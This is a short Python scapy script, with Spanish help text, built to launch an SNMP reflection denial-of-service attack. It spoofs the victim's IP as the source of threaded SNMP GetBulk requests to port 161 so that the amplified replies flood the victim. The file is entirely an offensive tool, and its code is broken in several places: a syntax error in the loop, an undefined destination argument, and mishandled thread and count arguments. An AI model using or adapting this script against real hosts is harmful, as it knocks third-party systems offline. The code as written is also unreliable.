
from scapy.all import *
from time import sleep

import logging
import argparse
import sys
import thread
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para hacer Dos con SNMP")
parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')

args = parser.parse_args()


def floodsnmp(target):
 for p range (int(args.CONECT)):
   bulk = SNMPbulk(max_repetitions = 50, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.2.1.1')), SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])
   snmp = SNMP(PDU=bulk)
   print 'Iniciando Dos a IP' + args.USER
   request = sr1(IP(src=args.USER, dst=args.DEST)/UDP(dport=161,sport=161)/snmp)



if __name__ == "__main__":
 for x in range(0,args.TH):
  thread.start_new_thread(floodsnmp, (args.USER))

